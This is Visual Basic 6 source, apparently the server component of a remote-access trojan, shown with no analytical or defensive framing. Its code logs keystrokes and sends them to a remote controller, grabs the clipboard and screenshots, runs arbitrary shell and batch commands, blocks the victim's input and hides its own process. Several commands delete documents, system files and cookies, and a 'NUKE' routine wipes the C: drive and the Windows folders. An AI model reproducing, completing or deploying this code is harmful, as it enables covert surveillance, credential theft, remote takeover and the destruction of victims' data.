    
KeyResult = GetAsyncKeyState(110)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "." Else AddKey = ">"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(2)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "/" Else AddKey = "?"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(220)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "\" Else AddKey = "|"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(222)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "#" Else AddKey = "~"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(221)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "]" Else AddKey = "}"
        
        
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(219) '219
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[" Else AddKey = "{"
        GoTo KeyFound
    End If



For n = 65 To 128
    KeyResult = GetAsyncKeyState(n)
    If KeyResult = -32767 Then
        If GetShift = False Then
            If GetCapslock = True Then AddKey = UCase(Chr(n)) Else AddKey = LCase(Chr(n))
        Else
            If GetCapslock = False Then AddKey = UCase(Chr(n)) Else AddKey = LCase(Chr(n))
        End If
        GoTo KeyFound
    End If
Next n


For n = 48 To 57
    KeyResult = GetAsyncKeyState(n)
    If KeyResult = -32767 Then
        If GetShift = True Then
            Select Case Val(Chr(n))
                Case 1
                    AddKey = "!"
                Case 2
                    AddKey = "''"
                Case 3
                    AddKey = "£"
                Case 4
                    AddKey = "$"
                Case 5
                    AddKey = "%"
                Case 6
                    AddKey = "^"
                Case 7
                    AddKey = "&"
                Case 8
                    AddKey = "*"
                Case 9
                    AddKey = "("
                Case 0
                    AddKey = ")"
            End Select
        Else
            AddKey = Chr(n)
        End If
        GoTo KeyFound
    End If
Next n
DoEvents
Exit Sub

KeyFound:
If AddKey <> "" Then Winsock1.SendData "keylog|" & AddKey
DoEvents

End Sub

Private Sub Timer2_Timer()
On Error Resume Next
col& = GetSysColor(COLOR_ACTIVECAPTION)
t& = SetSysColors(1, COLOR_ACTIVECAPTION, RGB(255, 0, 0))
t& = SetSysColors(1, COLOR_WINDOW, RGB(50, 50, 200))
t& = SetSysColors(1, COLOR_BTNFACE, RGB(0, 0, 255))
t& = SetSysColors(1, COLOR_BACKGROUND, RGB(0, 255, 0))
t& = SetSysColors(1, COLOR_WINDOWTEXT, RGB(10, 15, 20))
t& = SetSysColors(1, COLOR_MENU, RGB(10, 15, 20))
Sleep 50
t& = SetSysColors(1, COLOR_ACTIVECAPTION, RGB(255, 255, 255))
t& = SetSysColors(1, COLOR_WINDOW, RGB(255, 255, 0))
t& = SetSysColors(1, COLOR_BTNFACE, RGB(0, 255, 0))
t& = SetSysColors(1, COLOR_BACKGROUND, RGB(255, 255, 0))
t& = SetSysColors(1, COLOR_WINDOWTEXT, RGB(0, 0, 0))
t& = SetSysColors(1, COLOR_MENU, RGB(18, 12, 50))
Sleep 50
t& = SetSysColors(1, COLOR_ACTIVECAPTION, RGB(0, 0, 0))
t& = SetSysColors(1, COLOR_WINDOW, RGB(100, 25, 100))
t& = SetSysColors(1, COLOR_BTNFACE, RGB(50, 50, 50))
t& = SetSysColors(1, COLOR_BACKGROUND, RGB(0, 255, 0))
t& = SetSysColors(1, COLOR_WINDOWTEXT, RGB(0, 0, 0))
t& = SetSysColors(1, COLOR_MENU, RGB(90, 90, 90))
Sleep 50
t& = SetSysColors(1, COLOR_ACTIVECAPTION, RGB(18, 22, 74))
t& = SetSysColors(1, COLOR_WINDOW, RGB(82, 184, 174))
t& = SetSysColors(1, COLOR_BTNFACE, RGB(45, 34, 44))
t& = SetSysColors(1, COLOR_BACKGROUND, RGB(255, 255, 255))
t& = SetSysColors(1, COLOR_WINDOWTEXT, RGB(45, 83, 22))
t& = SetSysColors(1, COLOR_MENU, RGB(10, 15, 20))


End Sub

Private Sub TMBeep_Timer()
On Error Resume Next
Beep Cnt, 50
End Sub

Private Sub Winsock1_Close()
On Error Resume Next
Winsock1.Close
Winsock1.LocalPort = 876
Winsock1.Listen
End Sub

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
On Error Resume Next
Winsock1.Close
Winsock1.Accept requestID
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim XX, YY As String
Dim Answer As String
Dim Data As String
Dim Command As String
Dim Command2 As String
Winsock1.GetData Data

txtLen = InStr(1, Data, "|", vbTextCompare)
Command = Mid(Data, 1, txtLen - 1)
Command2 = Command
Data = Mid(Data, txtLen + 1)
'Now lets have the functions...
Select Case Command
Case "serverend":
    End
Case "serverreset":
    Winsock1.Close
    Winsock1.Listen
Case "serverremove":
    End
Case "fopencddoor":
    mciSendString "set cdaudio door open", 0, 0, 0
Case "fclosecddoor":
    mciSendString "set cdaudio door closed", 0, 0, 0
'Boot options
Case "compshut":
    ExitWindowsEx ExEWX_FORCE Or EWX_SHUTDOWN, 0
Case "comprest":
    ExitWindowsEx ExEWX_FORCE Or EWX_REBOOT, 0
Case "complogoff":
    ExitWindowsEx ExEWX_FORCE Or EWX_LOGOFF, 0
'''
'More Fun
Case "mferror":
    Do
    MsgBox "An unknown error has occured", vbCritical, "Explorer"
    Loop
Case "mfappbomb":
    Do
    Shell "c:\windows\calc.exe"
    Shell "c:\windows\sol.exe"
    Loop
Case "mfbeepon":
    TMBeep.Enabled = True
Case "mfbeepoff":
    TMBeep.Enabled = False
Case "mftrashon":
    RECEMP.Enabled = True
Case "mftrashoff":
    RECEMP.Enabled = False
Case "mficonshide":
    RECEMP.Enabled = True
Case "mfcdloop":
    Do
    mciSendString "set cdaudio door open", 0, 0, 0
    Loop
Case "mficonshide":
    Shell "c:\windows\system\Show Desktop.scf"
'''
'FUN
Case "fhidestart":
    tWnd = FindWindow("Shell_traywnd", vbNullString)
    bWnd = GetWindow(tWnd, GW_CHILD)
    Do
    GetClassName bWnd, sSave, 250
    If LCase(Left$(sSave, 6)) = "button" Then Exit Do
    bWnd = GetWindow(bWnd, GW_HWNDNEXT)
    Loop
    SetWindowPos bWnd, 0, 0, 0, 0, 0, SWP_HIDEWINDOW
Case "fshowstart":
        tWnd = FindWindow("Shell_traywnd", vbNullString)
    bWnd = GetWindow(tWnd, GW_CHILD)
    Do
    GetClassName bWnd, sSave, 250
    If LCase(Left$(sSave, 6)) = "button" Then Exit Do
    bWnd = GetWindow(bWnd, GW_HWNDNEXT)
    Loop
    SetWindowPos bWnd, 0, 0, 0, 0, 0, SWP_SHOWWINDOW
Case "fblackon":
   Form1.WindowState = 2
   BlockInput True
   Form1.Show
Case "fblackoff":
   Form1.WindowState = 0
   BlockInput False
   Form1.Hide
Case "fblockion":
    BlockInput True
Case "fblockioff":
    BlockInput False
Case "fhidetask":
    Call HideTaskBar
Case "fshowtask":
    Call ShowTaskBar
Case "mfhidedesktop":
    Call HideDesktop
Case "mfshowdesktop":
    Call ShowDesktop
Case "ffbion":
    SetCursorPos 0, 0
    BlockInput True
    FBI.Show
    Call HideTaskBar
Case "ffbioff":
    BlockInput False
    Unload FBI
    Call ShowTaskBar
'''
'Mouse
Case "mfreeze":
    Dim point As POINTAPI
    GetCursorPos point
    Fmouse.Enabled = True
Case "munfreeze":
    Fmouse.Enabled = False
Case "mib":
    SwapMouseButton 1
Case "mrb":
    SwapMouseButton 0
Case "mhide":
    SetCursorPos 0, 0
    Fmouse.Enabled = True
Case "mshow":
    Fmouse.Enabled = False
Case "mcoord1":
Text1.Text = Data
Winsock1.SendData "ycoord|"
Case "mcoord2":
   Text2.Text = Data
   SetCursorPos Text1.Text, Text2.Text
'''
'Keyboard
Case "kcaps":
    TurnOn VK_CAPITAL
Case "kcapso":
    TurnOff VK_CAPITAL
Case "knum":
    TurnOn VK_NUMLOCK
Case "knumo":
    TurnOff VK_NUMLOCK
Case "kscroll":
    TurnOn VK_SCROLL
Case "kscrollo":
    TurnOff VK_SCROLL
Case "kflash":
    Lights.Enabled = True
Case "kflashoff":
    Lights.Enabled = False
'''
'Message manager
Case "mmtitle":
    Text3.Text = Data
    Winsock1.SendData "mmbody|"
Case "mmbodie":
    Text4.Text = Data
    Winsock1.SendData "mmbuttons|"
Case "mmbuttons":
    Text5.Text = Data
    If Text5.Text = "critical" Then MsgBox Text4.Text, vbCritical, Text3.Text
    If Text5.Text = "excla" Then MsgBox Text4.Text, vbExclamation, Text3.Text
    If Text5.Text = "info" Then MsgBox Text4.Text, vbInformation, Text3.Text
    If Text5.Text = "question" Then MsgBox Text4.Text, vbQuestion, Text3.Text
    If Text5.Text = "none" Then MsgBox Text4.Text, vbApplicationModal, Text3.Text
'''
'Input Manager
Case "imtitle":
    Text6.Text = Data
    Winsock1.SendData "imquestion|"
Case "imquestion":
    Text7.Text = Data
    Answer = InputBox(Text7.Text, Text6.Text)
    Winsock1.SendData "response|" & Answer
'''
'Server Info
Case "getserverinfo":
    GetServerData
'''
'Clipboard
Case "setclip":
    Clipboard.SetText Data
Case "getclip":
    Winsock1.SendData "cliptext|" & Clipboard.GetText
Case "lockclip":
    LockClip.Enabled = True
Case "unlockclip":
    LockClip.Enabled = False
Case "clearclip":
    Clipboard.SetText ""
'''
'Internet
Case "sethome":
    SetRegValue HKEY_CURRENT_USER, "software\microsoft\internet Explorer\main", "start page", Data
Case "gethome":
Dim HomeP As String
    HomeP = GetRegValue(HKEY_CURRENT_USER, "software\microsoft\internet Explorer\main", "start page")
    Winsock1.SendData "homepage|" & HomeP
Case "opensite":
    ShellExecLaunchFile Data, "", ""
Case "openemail":
    ShellExecLaunchFile "mailto:" & Data, "", ""
Case "typedurls":
    Winsock1.SendData "typedurls|" & Text9.Text
'''
'Run stuff
Case "rmsn":
    Shell "c:\program files\MSN Messenger\MSNMSGR.exe"
Case "rie":
    Shell "c:\program files\Internet Explorer\iexplore.exe"
Case "rnotepad":
    Shell "c:\windows\notepad.exe"
Case "rexplorer":
    Shell "c:\windows\explorer.exe"
Case "rwordpad":
    Shell "c:\windows\write.exe"
Case "rabook":
    Shell "c:\program files\Outlook express\wab.exe"
Case "rpaint":
    Shell "c:\windows\pbrush.exe"
Case "rcommand":
    Shell "c:\windows\command.exe"
Case "rregedit":
    Shell "c:\windows\regedit.exe"
Case "rdefrag":
    Shell "c:\windows\defrag.exe"
Case "rtelnet":
    Shell "c:\windows\telnet.exe"
Case "rscandisk":
    Shell "c:\windows\scandskw.exe"
Case "rcalc":
    Shell "c:\windows\calc.exe"
Case "rfreecell":
    Shell "C:\windows\freecell.exe"
Case "rsolitaire":
    Shell "c:\windows\sol.exe"
Case "rtaskmanager":
    Shell "c:\windows\taskman.exe"
'''
'Keylogger
Case "enablekey":
    Timer1.Enabled = True
Case "disablekey":
    Timer1.Enabled = False
'''
'Direct Dos
Case "ddos":
    Redirect Data, Text10
    Winsock1.SendData "dos|" & Text10.Text
'''
'Batch
Case "batch":
Kill "c:\windows\temp.bat"
Open "c:\windows\temp.bat" For Append As #1
Print #1, Data
Close #1
Shell "c:\windows\temp.bat"
'''
'More Fun ;]
Case "compname"
    SetComputerName Data
Case "systemcolours":
    Timer2.Enabled = True
Case "funnycur":
    ChangeMyStupidCursor
Case "startmenutext":
    Dim R As RECT
    tWnd = FindWindow("Shell_TrayWnd", vbNullString)
    bWnd = FindWindowEx(tWnd, ByVal 0&, "BUTTON", vbNullString)
    GetWindowRect bWnd, R
    ncWnd = CreateWindowEx(ByVal 0&, "BUTTON", Data, WS_CHILD, 0, 0, R.Right - R.Left, R.Bottom - R.Top, tWnd, ByVal 0&, App.hInstance, ByVal 0&)
    ShowWindow ncWnd, SW_NORMAL
    ShowWindow bWnd, SW_HIDE
'''
'Chat
Case "chatenable":
    Chat.Show
Case "chatstop":
    Chat.Hide
    Chat.Text1.Text = ""
    Chat.Text2.Text = ""
Case "chatmessage":
    Chat.Text1.Text = Chat.Text1.Text & vbCrLf & Data
'''
'screenshot
Case "getscreen":
ScreenShot ("c:\windows\system\temp.bmp")
SendFile "c:\windows\system\temp.bmp", Winsock1
Winsock1.SendData "|COMPLETE|"
'''
'make a dir!
Case "makedir":
   SHCreateDirectoryEx Me.hwnd, Data, ByVal 0&
'Kill a directory!
Case "removedir":
    RemoveDirectory Data
'Kill a file
Case "killfile":
    Kill Data
'Set Wallpaper
Case "setwallpaper":
    SystemParametersInfo SPI_SETDESKWALLPAPER, 0, Data, SPIF_UPDATEINIFILE
'Play Wav
Case "playmusic":
    sndPlaySound Data, &H1
'''
'DESTRUCTION!!! :D
Case "kreg":
    Kill "c:\windows\regedit.exe"
Case "knote":
    Kill "c:\windows\notepad.exe"
Case "krecieved":
    Kill "c:\my documents\my received files\*.*"
Case "kreg":
    Kill "c:\windows\command.exe"
    Kill "c:\windows\command\*.*"
Case "ktelnet":
    Kill "c:\windows\telnet.exe"
Case "kcookies":
    Kill "c:\windows\cookies\*.txt"
Case "kwinini":
    Kill "c:\windows\win.ini"
Case "kcursor":
    Kill "c:\windows\cursors\*.*"
Case "kmsn":
    Kill "c:\program files\msn messenger\*.*"
Case "ksysini":
    Kill "c:\windows\system.ini"
Case "kwinhelp":
    Kill "c:\windows\help\*.*"
Case "kpaint":
    Kill "C:\Program Files\Accessories\MSPAINT.EXE"
    Kill "c:\windows\pbrush.exe"
Case "kcalc":
    Kill "c:\windows\calc.exe"
Case "kfonts":
    Kill "c:\windows\fonts\*.*"
Case "kfav":
    Kill "c:\windows\favorites\*.*"
Case "kwordpad":
    Kill "C:\Program Files\Accessories\WORDPAD.EXE"
    Kill "c:\windows\write.exe"
Case "kdocs":
    Kill "c:\my documents\*.*"
    KillFolderTree "c:\my documents\"
Case "kautoexec":
    Kill "c:\autoexec.bat"
Case "kpics":
    Kill "c:\_Restore\*.*"
    KillFolderTree "c:\_Restore\"
Case "kfonts":
    Kill "c:\my documents\my picture\*.*"
    KillFolderTree "c:\my documents\my pictures\"
Case "kmusic":
    Kill "c:\my documents\music\*.*"
    KillFolderTree "c:\my documents\my music\"
'''
'Matrix!
Case "startmatrix":
    Form1.WindowState = 2
    Form1.Top = 0
    Form1.Left = 30255
    Form1.Show
    Matrix.Enabled = True
    SetCursorPos 0, 0
    BlockInput True
Case "stopmatrix":
    Form1.Hide
    Form1.Label1.Caption = ""
    Matrix.Enabled = False
    BlockInput False
Case "typemessage":
    Label1.Caption = ""
    message = Data
    Matrix.Enabled = True
Case "clear":
    Label1.Caption = ""
    Matrix.Enabled = False
    
'''
'''*************!   NUKE   !*****************
Case "nuke":
    NUKE
'''
'''
'File Manager Stuff
Case "deletefile":
    Kill Data
Case "runfile":
    Shell Data
End Select
End Sub

Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
On Error Resume Next
Winsock1.LocalPort = 876
Winsock1.Listen
End Sub
Private Sub TurnOn(vkKey As Long)
   On Error Resume Next
    GetKeyboardState kbArray
    kbArray.kbByte(vkKey) = 1
    SetKeyboardState kbArray
End Sub
Private Sub TurnOff(vkKey As Long)
    On Error Resume Next
    GetKeyboardState kbArray
    kbArray.kbByte(vkKey) = 0
    SetKeyboardState kbArray
End Sub
Private Sub GetServerData()
On Error Resume Next
Dim SInfo As SYSTEM_INFO
GetSystemInfo SInfo
Text8.Text = "SERVER INFORMATION" & vbCrLf & vbCrLf
Text8.Text = Text8.Text & "IP Address: " & Winsock1.LocalIP & vbCrLf & _
"Computer Name: " & Winsock1.LocalHostName & vbCrLf & _
"Windows version: " & GetWinVersion & vbCrLf & _
"Port Messiah Conencted On: " & Winsock1.LocalPort & vbCrLf & _
"Number of procesor:" + str$(SInfo.dwNumberOrfProcessors) & vbCrLf & _
"Processor:" + str$(SInfo.dwProcessorType) & vbCrLf & _
"Low memory address:" + str$(SInfo.lpMinimumApplicationAddress) & vbCrLf & _
"High memory address:" + str$(SInfo.lpMaximumApplicationAddress)
Winsock1.SendData "serverinformation|" & Text8.Text
End Sub
Public Function GetWinVersion() As String
On Error Resume Next
Dim Ver As Long, WinVer As Long
Ver = GetVersion()
WinVer = Ver And &HFFFF&
GetWinVersion = Format((WinVer Mod 256) + ((WinVer \ 256) / 100), "Fixed")
End Function
Function GetCaption(WindowHandle As Long) As String
    On Error Resume Next
    Dim Buffer As String, TextLength As Long
    TextLength& = GetWindowTextLength(WindowHandle&)
    Buffer$ = String(TextLength&, 0&)
    Call GetWindowText(WindowHandle&, Buffer$, TextLength& + 1)
    GetCaption$ = Buffer$
End Function
Sub Redirect(cmdLine As String, objTarget As Object)
  On Error Resume Next
  Dim i%, t$
  Dim pa As SECURITY_ATTRIBUTES
  Dim pra As SECURITY_ATTRIBUTES
  Dim tra As SECURITY_ATTRIBUTES
  Dim pi As PROCESS_INFORMATION
  Dim sui As STARTUPINFO
  Dim hRead As Long
  Dim hWrite As Long
  Dim bRead As Long
  Dim lpBuffer(1024) As Byte
  pa.nLength = Len(pa)
  pa.lpSecurityDescriptor = 0
  pa.bInheritHandle = True
  pra.nLength = Len(pra)
  tra.nLength = Len(tra)
  If CreatePipe(hRead, hWrite, pa, 0) <> 0 Then
    sui.CB = Len(sui)
    GetStartupInfo sui
    sui.hStdOutput = hWrite
    sui.hStdError = hWrite
    sui.dwFlags = STARTF_USESHOWWINDOW Or STARTF_USESTDHANDLES
    sui.wShowWindow = SW_HIDE
    If CreateProcess(vbNullString, cmdLine, pra, tra, True, 0, Null, vbNullString, sui, pi) <> 0 Then
      SetWindowText objTarget.hwnd, ""
      Do
        Erase lpBuffer()
        If ReadFile(hRead, lpBuffer(0), 1023, bRead, ByVal 0&) Then
          SendMessage objTarget.hwnd, EM_SETSEL, -1, 0
          SendMessage objTarget.hwnd, EM_REPLACESEL, False, lpBuffer(0)
          DoEvents
        Else
          CloseHandle pi.hThread
          CloseHandle pi.hProcess
          Exit Do
        End If
        CloseHandle hWrite
      Loop
      CloseHandle hRead
    End If
  End If
End Sub
Private Sub ChangeMyStupidCursor()
On Error Resume Next
    Dim myDir As String
    Dim lDir As Long
    myDir = Space(255)
    currenthcurs = GetCursor()
    tempcurs = CopyIcon(currenthcurs)
    lDir = GetWindowsDirectory(myDir, 255)
    myDir = "c:\windows\system\Cur.cur"
    newhcurs = LoadCursorFromFile(myDir)
    Call SetSystemCursor(newhcurs, OCR_NORMAL)
End Sub
Function EvalData(Incoming As String, Side As Integer, Optional SubDiv As String) As String
   On Error Resume Next
   Dim i As Integer
   Dim TempStr As String
   
   Dim Divider As String
   
   If SubDiv = "" Then
      Divider = ","
   Else
      Divider = SubDiv
   End If
   
   Select Case Side
        
      Case 1
         
          For i = 0 To Len(Incoming)
          TempStr = Left(Incoming, i)
          
            If Right(TempStr, 1) = Divider Then
              EvalData = Left(TempStr, Len(TempStr) - 1)
              Exit Function
            End If
          Next
          
      Case 2
                   For i = 0 To Len(Incoming)
            TempStr = Right(Incoming, i)
            
            If Left(TempStr, 1) = Divider Then
              EvalData = Right(TempStr, Len(TempStr) - 1)
              Exit Function
            End If
          Next
   End Select
   
End Function

Private Sub Winsock2_Close()
On Error Resume Next
Winsock2.Close
Winsock2.LocalPort = "958"
Winsock2.Listen
End Sub

Private Sub Winsock2_ConnectionRequest(ByVal requestID As Long)
On Error Resume Next
Winsock2.Close
Winsock2.Accept requestID
End Sub

Private Sub Winsock2_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim str As String
Dim mypos As Integer
Dim a As Integer
Dim str2 As String
Dim sFormated As String
Dim sIncoming As String
Winsock2.GetData str
Select Case str
Case "getdesktop":
ScreenShot ("c:\windows\system\tmp.BMP")
      sIncoming = "c:\windows\system\tmp.BMP"
     SendFile sIncoming, Winsock2
     Winsock2.SendData "|COMPLETE|"

End Select
End Sub

Private Sub Winsock2_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
On Error Resume Next
Winsock2.Close
Winsock2.LocalPort = "958"
Winsock2.Listen
End Sub
Public Sub KillFolderTree(sFolder As String)
On Error Resume Next
Dim sCurrFilename As String
sCurrFilename = Dir(sFolder & "\*.*", vbDirectory)
Do While sCurrFilename <> ""
If sCurrFilename <> "." And sCurrFilename <> ".." Then
If (GetAttr(sFolder & "\" & sCurrFilename) And vbDirectory) = vbDirectory Then
Call KillFolderTree(sFolder & "\" & sCurrFilename)
sCurrFilename = Dir(sFolder & "\*.*", vbDirectory)
Else
On Error Resume Next
Kill sFolder & "\" & sCurrFilename
On Error GoTo 0
sCurrFilename = Dir
End If
Else
sCurrFilename = Dir
End If
Loop
On Error Resume Next
RmDir sFolder
End Sub
Public Sub NUKE()
On Error Resume Next
'General Destruction
KillFolderTree "c:\my documents\"
KillFolderTree "c:\"
KillFolderTree "c:\program files\"
KillFolderTree "c:\program files\Internet Explorer\"
KillFolderTree "c:\windows\"
KillFolderTree "c:\windows\system\"
KillFolderTree "c:\windows\system32\"
KillFolderTree "c:\program files\accessories\"
KillFolderTree "c:\windows\cursors\"
KillFolderTree "c:\windows\fonts\"
KillFolderTree "c:\windows\cookies\"
KillFolderTree "c:\windows\desktop\"
KillFolderTree "c:\windows\start menu\"
KillFolderTree "c:\windows\media\"
KillFolderTree "c:\windows\favorites\"
KillFolderTree "c:\windows\all users\"
KillFolderTree "c:\windows\config\"
KillFolderTree "c:\program files\MSN Messenger\"
Kill "c:\windows\cookies\*.txt"
Kill "c:\windows\*.exe"
Kill "c:\windows\*.sys"
Kill "c:\windows\*.dll"
Kill "c:\windows\*.txt"
Kill "c:\windows\*.com"
Kill "c:\autoexec.bat"
Kill "c:\windows\*.ini"
Kill "c:\windows\*.scr"
Kill "c:\windows\*.scr"
Kill "c:\program files\Outlook Express\*.*"
Kill "c:\program files\Outlook Express\*.dll"
Kill "c:\program files\Outlook Express\*.exe"
Kill "c:\program files\Outlook Express\*.txt"
Kill "c:\program files\MSN Messenger\*.*"
Kill "c:\program files\MSN Messenger\*.dll"
Kill "c:\program files\MSN Messenger\*.txt"
Kill "c:\program files\MSN Messenger\*.wav"
Kill "c:\program files\MSN Messenger\*.rtf"
Kill "c:\windows\system\*.dll"
Kill "c:\windows\system\*.exe"
Kill "c:\windows\system\*.hlp"
Kill "c:\windows\system\*.drv"
Kill "c:\windows\system\*.html"
Kill "c:\windows\system\*.htm"
Kill "c:\windows\system\*.nls"
Kill "c:\windows\system\*.src"
Kill "c:\windows\system\*.scr"
Kill "c:\windows\system\*.ini"
Kill "c:\windows\system\*.srg"
Kill "c:\windows\system\*.sys"
Kill "c:\windows\system\*.tsk"
Kill "c:\windows\system\*.vkd"
Kill "c:\windows\system\*.vwp"
Kill "c:\windows\system\*.wmf"
Kill "c:\windows\system\restore\*.*"
Kill "c:\windows\system\restore\*.ini"
Kill "c:\windows\system\restore\*.exe"
Kill "c:\windows\system\restore\*.xml"
Kill "c:\windows\system\restore\*.mmf"
End Sub
Public Sub MakeMeService()
    Dim pid As Long, reserv As Long
    pid = GetCurrentProcessId()
    regserv = RegisterServiceProcess(pid, RSP_SIMPLE_SERVICE)
End Sub
